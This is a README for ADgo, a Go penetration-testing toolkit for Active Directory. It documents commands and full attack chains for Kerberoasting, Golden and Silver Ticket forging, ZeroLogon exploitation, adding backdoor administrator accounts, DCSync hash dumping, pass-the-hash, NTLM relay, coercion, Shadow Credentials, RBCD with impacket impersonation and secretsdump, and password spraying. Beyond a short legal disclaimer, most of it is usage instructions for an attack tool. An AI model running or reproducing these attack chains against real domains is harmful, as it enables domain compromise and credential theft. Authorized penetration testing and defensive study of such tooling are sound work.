# ADgo — Active Directory Pentesting Toolkit in Go

**ADgo** is an audit and penetration testing tool for **Active Directory**, written in Go.  
It allows you to enumerate, exploit, and analyze AD environments with features such as BloodHound export, NTLM/Kerberos attacks, Shadow Credentials, ACL abuse, RBCD, and more.

> ⚠️ **This tool is intended for legal and authorized tests only. The author accepts no responsibility for misuse.**

---

## 📋 Features

### Enumeration
| Command | Description |
|---|---|
| `ldap users` | Enumerate domain users (SPN, disabled, locked, AS-REP roastable) |
| `ldap groups` | Enumerate domain groups and memberships |
| `ldap computers` | Enumerate domain computers |
| `ldap spns` | List accounts with Service Principal Names (Kerberoast targets) |
| `ldap asreproast` | Find accounts with pre-auth disabled (no credentials required) |
| `ldap password-policy` | Read the Default Domain Password Policy |

### SMB
| Command | Description |
|---|---|
| `smb shares` | List accessible SMB shares |
| `smb download` | Download a file from a share |
| `smb upload` | Upload a file to a share |

### NTLM
| Command | Description |
|---|---|
| `ntlm ntlmv1` | Capture NTLMv1 hashes |
| `ntlm ntlmv2` | Capture NTLMv2 hashes |
| `ntlm ntlmrelay` | Start an NTLM relay server |

### Kerberos
| Command | Description |
|---|---|
| `kerberos kerberoast` | Kerberoasting — request TGS for SPN accounts |
| `kerberos getTGT` | Request a TGT (password or NT hash) and export `.ccache` |
| `kerberos goldenticket` | Forge a Golden Ticket |
| `kerberos silverticket` | Forge a Silver Ticket |

### Exploits
| Command | Description |
|---|---|
| `exploits zerologon` | Exploit the ZeroLogon vulnerability (CVE-2020-1472) |

### Persistence
| Command | Description |
|---|---|
| `persistence add-admin-user` | Add a backdoor administrator account |
| `persistence dump-ntlm` | Dump NTLM hashes via DCSync |

### Lateral Movement
| Command | Description |
|---|---|
| `lateral-movement pth` | Pass-the-Hash via SMB |
| `lateral-movement psexec` | Remote command execution via PSExec |

### RPC / WinRM / WMI
| Command | Description |
|---|---|
| `rpc enumerate` | Enumerate via RPC |
| `rpc script` | Execute an RPC script |
| `winrm exec` | Execute commands via WinRM |
| `wmi query` | WMI queries for system information |

### Coercion
| Command | Description |
|---|---|
| `coercion petitpotam` | Coerce NTLM authentication via PetitPotam |
| `coercion printerbug` | Coerce NTLM authentication via PrinterBug (MS-RPRN) |

### ADCS
| Command | Description |
|---|---|
| `ntlm adcs enum` | Enumerate Certificate Authorities and templates |
| `ntlm adcs audit` | Detect ESC1/ESC2/ESC3/ESC6/ESC8 misconfigurations |

---

## 🔴 Offensive Attack Features

### Shadow Credentials
Abuse `msDS-KeyCredentialLink` to obtain a TGT without knowing the target's password.  
Requires **GenericWrite** on the target object.

| Command | Description |
|---|---|
| `attack shadow list --target <user>` | List existing Shadow Credentials on a target |
| `attack shadow add --target <user>` | Inject a Shadow Credential (generates RSA key + PFX certificate) |
| `attack shadow remove --target <user> --key-id <id>` | Remove a Shadow Credential (cleanup) |

```bash
# Full attack chain
adgo attack shadow add --target john -u admin -p pass -d lab.local
adgo kerberos getTGT --pfx john_shadow.pfx --target john
# Or with certipy:
certipy auth -pfx john_shadow.pfx -dc-ip 192.168.1.10
```

### ACL Enumeration & Abuse
Parse `nTSecurityDescriptor` in binary to detect exploitable rights across the domain.

| Command | Description |
|---|---|
| `attack acl enum` | Find all dangerous ACLs in the domain |
| `attack acl enum --target <object>` | Analyze ACLs on a specific object |

Detected rights: `GenericAll`, `WriteDACL`, `WriteOwner`, `GenericWrite`, `ForceChangePassword`, `DCSync`, `AddMember`, `AllExtendedRights`

```bash
adgo attack acl enum -u admin -p pass -d lab.local
adgo attack acl enum --target john -u admin -p pass -d lab.local --json
```

### Resource-Based Constrained Delegation (RBCD)
Write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a target computer.  
Requires **GenericWrite** on the target machine.

| Command | Description |
|---|---|
| `attack rbcd setup --target <machine> --attacker <account>` | Configure RBCD on target |
| `attack rbcd read --target <machine>` | Read current RBCD configuration |
| `attack rbcd clear --target <machine>` | Remove RBCD configuration (cleanup) |

```bash
# Configure RBCD then use impacket for S4U2Proxy
adgo attack rbcd setup --target DC01 --attacker attacker$ -u admin -p pass -d lab.local
impacket-getST -spn cifs/DC01 -impersonate Administrator -dc-ip 192.168.1.10 lab.local/attacker$:pass
```

### Password Spray (Anti-Lockout)
Automatically reads the domain password policy via LDAP and calculates a safe delay.

| Command | Description |
|---|---|
| `spray --users <file> --password <pass> -d <domain> --dc-ip <ip>` | Launch password spray |
| `spray ... --dry-run` | Simulate without sending any authentication attempt |
| `spray ... --delay 45m` | Override the auto-calculated delay |
| `spray ... --continue-on-success` | Continue after finding a valid credential |

```bash
# Auto delay calculated from lockout policy
adgo spray --users users.txt --password "Winter2024!" -d lab.local --dc-ip 192.168.1.10 -u reader -p pass

# Dry-run to check configuration before launching
adgo spray --users users.txt --password "Pass" -d lab.local --dc-ip 192.168.1.10 --dry-run
```

**Anti-lockout logic:**
- Reads `lockoutThreshold` and `lockoutObservationWindow` from the DC
- Calculates total delay = `observationWindow × 1.2` (20% safety margin)
- Distributes the delay across all users
- Detects locked accounts in real time (`LDAP error 775`) and pauses

---

## 🛠 Installation

### Prerequisites
- **Go 1.20+**
- **Git**

### Steps

```bash
git clone https://github.com/Fr3nch4Sec/adgo.git
cd adgo
go mod tidy
go build -o adgo.exe ./cmd/adgo   # Windows
go build -o adgo ./cmd/adgo       # Linux/macOS
./adgo --help
```

---

## ⚙️ Global Options

| Option | Description |
|---|---|
| `-u, --username` | Username (e.g. `administrator` or `user@domain`) |
| `-p, --password` | Password |
| `-d, --domain` | Domain name (e.g. `lab.local`) |
| `--hash` / `--ntlm` | NT hash instead of password |
| `--dc-ip` | Domain Controller IP (required for some commands) |
| `--json` | Output in JSON format |
| `--bloodhound` | Generate BloodHound-compatible JSON |
| `--debug` | Enable debug mode |
| `--quiet` | Suppress info/success messages |
| `--no-banner` | Disable the ASCII banner |
| `--config` | Path to a configuration file (YAML) |

---

## 📖 Usage Examples

### 1. LDAP enumeration with BloodHound export
```bash
./adgo ldap users --bloodhound -u admin -p pass -d lab.local
# Generates bloodhound_users.json
```

### 2. Kerberoasting
```bash
./adgo kerberos kerberoast -u admin -p pass -d lab.local
```

### 3. Get a TGT (Pass-the-Key with NT hash)
```bash
./adgo kerberos getTGT -u john -d lab.local --hash aad3b435b51404eeaad3b435b51404ee
export KRB5CCNAME=john_lab.local.ccache
```

### 4. Shadow Credentials full chain
```bash
./adgo attack shadow add --target serviceaccount -u admin -p pass -d lab.local
certipy auth -pfx serviceaccount_shadow.pfx -dc-ip 192.168.1.10
```

### 5. Find exploitable ACLs
```bash
./adgo attack acl enum -u john -p pass -d lab.local
```

### 6. RBCD attack
```bash
./adgo attack rbcd setup --target WEB01 --attacker attacker$ -u admin -p pass -d lab.local
impacket-getST -spn cifs/WEB01 -impersonate Administrator -dc-ip 192.168.1.10 lab.local/attacker$:pass
export KRB5CCNAME=Administrator@cifs_WEB01.ccache
impacket-secretsdump -k -no-pass WEB01
```

### 7. Password spray (safe)
```bash
./adgo spray --users wordlists/users.txt --password "Summer2025!" -d lab.local --dc-ip 192.168.1.10 -u reader -p readpass
```

### 8. ZeroLogon
```bash
./adgo exploits zerologon --target 192.168.1.10
```

### 9. Pass-the-Hash
```bash
./adgo lateral-movement pth --target 192.168.1.10 --username administrator --nthash a1b2c3d4e5f6...
```

### 10. ADCS audit
```bash
./adgo ntlm adcs audit -u admin -p pass -d lab.local
# Detects ESC1/ESC2/ESC3/ESC6/ESC8
```

---

## 🗂 Project Structure

```
adgo/
├── cmd/
│   └── adgo/
│       ├── main.go
│       └── commands/          # CLI commands (Cobra)
│           ├── adattack.go    # Shadow Creds, ACL, RBCD
│           ├── spray.go       # Password spray
│           ├── kerberos.go
│           ├── ldap.go
│           ├── smb.go
│           └── ...
├── pkg/
│   ├── adattack/              # Shadow Creds, ACL parser, RBCD
│   │   ├── shadow_creds.go
│   │   ├── acl.go
│   │   ├── rbcd.go
│   │   └── adattack_test.go
│   ├── adcs/                  # ADCS enumeration + ESC detection
│   ├── common/                # Shared utilities
│   │   ├── print.go           # Colored output (fatih/color)
│   │   ├── progress.go        # Progress bar + spinner
│   │   ├── table.go           # Table rendering
│   │   ├── credentials.go
│   │   └── output.go          # BloodHound export
│   ├── coercion/              # PetitPotam, PrinterBug
│   ├── exploits/              # ZeroLogon, DCSync, PtH
│   ├── kerberos/              # TGT, ccache MIT v4, tickets
│   │   ├── tickets.go
│   │   └── tickets_test.go
│   ├── ldap/                  # LDAP client, user/group/computer enum
│   ├── ntlm/                  # NTLMv1, NTLMv2, relay
│   ├── rpc/                   # RPC client
│   ├── samr/                  # SAMR-like enumeration via LDAP
│   ├── smb/                   # SMB client (go-smb2)
│   ├── winrm/                 # WinRM client
│   └── wmi/                   # WMI via WinRM
├── configs/
│   ├── config.yaml
│   └── credentials.yaml       # ⚠️ Add to .gitignore
├── scripts/                   # External scripts (Python, PowerShell)
└── go.mod
```

---

## 🧪 Tests

```bash
# All tests
go test ./...

# Specific packages
go test ./pkg/adattack/ -v     # Shadow Creds, ACL parser, RBCD, SID encoding
go test ./pkg/kerberos/ -v     # ccache MIT v4 format
go test ./cmd/adgo/commands/ -v # Anti-lockout helpers, spray logic
```

**Covered:**
- `parseSID` / `encodeSID` round-trip
- `buildKeyCredentialBlob` structure and Base64 KeyID
- `parseSecurityDescriptor` + `buildRBCDSecurityDescriptor` round-trip
- `buildCCacheFile` magic bytes, principal encoding, ticket embedding
- `calculateSafeDelay` margin and floor
- `windowsIntervalToDuration` Windows FILETIME conversion
- `domainToBaseDN` conversion

---

## 🔑 Key Dependencies

| Package | Usage |
|---|---|
| `github.com/spf13/cobra` | CLI framework |
| `github.com/go-ldap/ldap/v3` | LDAP client |
| `github.com/hirochachacha/go-smb2` | SMB client + PtH |
| `github.com/jcmturner/gokrb5/v8` | Native Kerberos (TGT, tickets) |
| `github.com/masterzen/winrm` | WinRM client |
| `github.com/fatih/color` | Colored terminal output |
| `github.com/olekukonko/tablewriter` | Table rendering |
| `gopkg.in/yaml.v3` | YAML configuration |

---

## 🛡 Safety & Legal

- **Use only on systems you own or have explicit written permission to test.**
- `credentials.yaml` must be in `.gitignore` — it contains plaintext passwords.
- All attack commands implement cleanup options (`--key-id` for shadow creds, `rbcd clear`) to restore the target to its original state.

---

## 🚀 Contribute

Contributions are welcome. To contribute:
1. Fork the repository
2. Create a branch (`git checkout -b feature/my-feature`)
3. Commit your changes (`git commit -m 'Add my feature'`)
4. Push and open a Pull Request

---

## 📜 License

This project is licensed **MIT**. See [LICENSE](LICENSE) for details.

---

## 📬 Contact

- **GitHub** : [@Fr3nch4Sec](https://github.com/Fr3nch4Sec)
- **Mail** : yoanncoudry494@gmail.com